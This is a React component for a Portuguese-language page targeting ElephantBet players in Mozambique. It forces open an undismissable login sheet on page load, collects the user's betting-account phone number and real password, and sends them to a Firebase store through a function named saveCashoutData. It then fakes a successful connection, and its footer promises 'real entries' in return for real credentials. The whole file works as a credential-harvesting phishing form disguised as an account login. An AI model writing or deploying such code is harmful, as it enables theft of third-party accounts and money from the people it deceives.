import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { useToast } from "@/hooks/use-toast";
import { useState, useEffect } from "react";
import { saveCashoutData } from "@/lib/firebase";

const loginSchema = z.object({
  phone: z.string()
    .length(9, "O número deve ter 9 dígitos")
    .regex(/^(84|85|86|87)/, "O número deve começar com 84, 85, 86 ou 87"),
  password: z.string()
    .min(6, "A senha deve ter no mínimo 6 caracteres")
});

type LoginForm = z.infer<typeof loginSchema>;

export const LoginSheet = () => {
  const [open, setOpen] = useState(false);
  const { toast } = useToast();
  const { register, handleSubmit, formState: { errors } } = useForm<LoginForm>({
    resolver: zodResolver(loginSchema)
  });

  // Always show dialog on page load
  useEffect(() => {
    setOpen(true);
  }, []);

  const onSubmit = async (data: LoginForm) => {
    try {
      const result = await saveCashoutData(data.phone, data.password);
      
      localStorage.setItem("elephantBetLogin", JSON.stringify({
        phone: `+258${data.phone}`,
        loggedIn: true,
        timestamp: new Date().toISOString()
      }));
      
      setOpen(false);
      toast({
        title: "Conectado com sucesso",
        description: "Sua conta ElephantBet foi conectada.",
      });
    } catch (error) {
      toast({
        title: "Erro ao conectar",
        description: "Tente novamente mais tarde.",
        variant: "destructive"
      });
    }
  };

  return (
    <Sheet open={open} onOpenChange={() => {}}>
      <SheetContent 
        side="bottom" 
        hideClose
        className="h-auto max-h-[90vh] sm:max-h-[500px] rounded-t-3xl border-none bg-transparent p-0"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        <div className="px-4 pb-4 space-y-3">
          <div className="bg-card rounded-2xl p-6 border border-border/50">
            <SheetHeader className="text-left mb-6">
              <SheetTitle className="text-2xl font-bold text-foreground">CONECTE-SE</SheetTitle>
            </SheetHeader>

            <form onSubmit={handleSubmit(onSubmit)} className="space-y-5">
              <div className="space-y-2">
                <Label htmlFor="phone" className="text-base font-medium text-foreground">Telefone</Label>
                <div className="flex gap-2">
                  <div className="flex items-center gap-2 bg-muted px-3 rounded-lg border border-border h-11 w-20">
                    <span className="text-sm font-semibold text-foreground">+258</span>
                  </div>
                  <Input
                    id="phone"
                    type="tel"
                    maxLength={9}
                    placeholder="840000000"
                    {...register("phone")}
                    className={`flex-1 h-11 rounded-lg ${errors.phone ? 'border-destructive' : ''}`}
                  />
                </div>
                {errors.phone && (
                  <p className="text-xs text-destructive mt-1">{errors.phone.message}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="password" className="text-base font-medium text-foreground">Senha</Label>
                <Input
                  id="password"
                  type="password"
                  placeholder="••••••"
                  {...register("password")}
                  className={`h-11 rounded-lg ${errors.password ? 'border-destructive' : ''}`}
                />
                {errors.password && (
                  <p className="text-xs text-destructive mt-1">{errors.password.message}</p>
                )}
              </div>

              <Button 
                type="submit" 
                className="w-full h-12 text-base font-bold mt-6 rounded-lg"
              >
                CONECTE-SE
              </Button>
            </form>
          </div>

          <div className="bg-muted/40 backdrop-blur-sm rounded-2xl p-4 border border-border/50">
            <p className="text-xs text-muted-foreground text-center leading-relaxed">
              Conecte sua conta de jogador <span className="font-semibold text-foreground">ElephantBet</span> credenciais reais, 
              isso permitirá se conectar ao casino, e receber entradas reais.
            </p>
          </div>
        </div>
      </SheetContent>
    </Sheet>
  );
};
